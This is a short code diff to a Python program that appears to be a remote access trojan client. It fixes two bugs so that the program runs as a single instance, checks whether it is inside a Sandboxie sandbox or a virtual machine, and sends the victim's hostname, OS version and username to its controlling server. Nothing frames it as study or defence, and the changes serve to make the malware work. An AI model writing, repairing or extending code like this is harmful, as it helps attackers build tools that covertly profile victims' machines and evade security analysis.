@@ -17,7 +17,7 @@ intBuff = 1024
 #only one single thread - prevent multiple instances
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
 
-if win32api.GetLastError() == winerror.ERROR_ALREADY_EXIST:
+if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
     sys.exit(0)
 
@@ -50,7 +50,7 @@ def server_connect():
 
         else: break
 
-    str_user_info = socket.gethostbyname() + "'," + platform.system() + "  " + platform.release() + detectSandboxie() + detectVM() + "', " + os.environ["USERNAME"]
+    str_user_info = socket.gethostname() + "'," + platform.system() + "  " + platform.release() + detectSandboxie() + detectVM() + "', " + os.environ["USERNAME"]
     send(str.encode(str_user_info))
 
 decode_utf8 = lambda data: data.decode("utf-8")
